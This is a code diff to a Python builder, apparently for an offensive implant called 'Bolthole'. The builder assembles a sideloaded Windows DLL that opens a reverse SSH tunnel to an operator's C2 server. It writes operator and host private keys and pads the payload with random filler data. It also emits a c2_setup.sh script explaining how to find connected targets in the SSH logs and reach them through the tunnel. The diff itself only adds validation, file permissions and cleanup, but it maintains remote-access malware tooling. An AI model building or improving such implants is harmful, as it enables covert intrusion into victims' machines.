@@ -100,6 +100,9 @@ class BoltholeBuilder:
         if not self.payload.ssh_host.strip():
             raise Exception("ssh_host cannot be empty")
 
+        if not re.match(r'^[a-z_][a-z0-9_-]{0,31}$', self.payload.ssh_user):
+            raise Exception("ssh_user must be a valid Linux username (lowercase letters, digits, _ and -, max 32 chars)")
+
         try:
             self._port_list = [
                 int(p.strip()) for p in self.payload.ports.split(",") if p.strip()
@@ -175,8 +178,8 @@ class BoltholeBuilder:
         finally:
             if tmp_keyfile and os.path.exists(tmp_keyfile):
                 os.unlink(tmp_keyfile)
-            pub = (tmp_keyfile or "") + ".pub"
-            if os.path.exists(pub):
+            pub = f"{tmp_keyfile}.pub" if tmp_keyfile else None
+            if pub and os.path.exists(pub):
                 os.unlink(pub)
         return private_key, public_key
 
@@ -196,6 +199,7 @@ class BoltholeBuilder:
         operator_key_path = os.path.join(self.build_dir, "operator_key")
         with open(operator_key_path, "w") as f:
             f.write(private_key)
+        os.chmod(operator_key_path, 0o600)
         self.logger.debug("Wrote operator private key to %s", operator_key_path)
 
         auth_keys_path = os.path.join(self.temp_dir, self._files_dir_name, "authorized_keys")
@@ -212,6 +216,7 @@ class BoltholeBuilder:
         bolt_key_path = os.path.join(self.temp_dir, self._files_dir_name, self._bolt_key)
         with open(bolt_key_path, "w", newline="\n") as f:
             f.write(bolt_host_private)
+        os.chmod(bolt_key_path, 0o600)
         self.logger.debug("Rotated %s host key for build %s", self._bolt_key, self.buildid)
 
     def template_files(self):
@@ -325,16 +330,23 @@ class BoltholeBuilder:
             else (self.payload.inflate - max_data_cs_outer) * 1024 * 1024
         )
         training_data_file = os.path.join(self.temp_dir, "training.data")
+        _chunk = 4 * 1024 * 1024
+        remaining = training_data_size
         with open(training_data_file, "wb") as f:
-            f.write(os.urandom(training_data_size))
+            while remaining > 0:
+                chunk_size = min(_chunk, remaining)
+                f.write(os.urandom(chunk_size))
+                remaining -= chunk_size
         self.logger.debug("Created training.data: %d bytes", training_data_size)
 
     def compile_artefacts(self):
         self.logger.debug("Building with: %s", BOLTHOLE_BUILD_CMD)
         curr_dir = os.getcwd()
-        os.chdir(self.temp_dir)
-        run_cmd_check_file(BOLTHOLE_BUILD_CMD, self.tgt_dll, self.logger)
-        os.chdir(curr_dir)
+        try:
+            os.chdir(self.temp_dir)
+            run_cmd_check_file(BOLTHOLE_BUILD_CMD, self.tgt_dll, self.logger)
+        finally:
+            os.chdir(curr_dir)
 
     def prepare_files_in_build_dir(self):
         sideload_key = self.payload.sideload.lower()
@@ -628,7 +640,7 @@ echo "[+] Done. When a target connects, read the operator port from the C2 auth 
 echo "    journalctl -u ssh | grep 'Invalid user'"
 echo "    Format: Invalid user <win-user>.<machine>.p<PORT> from ..."
 echo "    The .p<PORT> suffix is the dynamic tunnel port — use it to connect:"
-echo "    ssh -i operator_key -p <PORT> $SSH_USER@localhost"
+echo "    ssh -i operator_key -p <PORT> <win-user>@localhost"
 """
         setup_path = os.path.join(self.build_dir, "c2_setup.sh")
         with open(setup_path, "w") as f:
@@ -680,3 +692,9 @@ def bolthole_build_func(buildid: str, payload: BoltholePayload):
         GlobalLogger.error("Traceback: %s", traceback.format_exc())
         if builder is not None:
             builder.logger.error("Build failed: %s", exc)
+    finally:
+        if builder is not None and builder._temp_dir is not None:
+            try:
+                builder._temp_dir.cleanup()
+            except Exception:  # pylint: disable=broad-except
+                pass
